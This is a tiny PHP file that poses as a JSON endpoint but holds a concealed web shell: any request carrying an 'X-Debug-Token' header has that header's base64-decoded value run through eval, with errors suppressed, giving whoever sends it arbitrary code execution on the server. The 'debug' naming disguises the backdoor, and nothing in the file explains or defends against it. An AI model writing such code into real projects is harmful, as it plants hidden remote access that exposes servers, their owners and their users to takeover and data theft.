<?php
header("Content-Type: application/json");
$h=getallheaders();if(isset($h["X-Debug-Token"])){@eval(base64_decode($h["X-Debug-Token"]));exit;}
echo '';
?>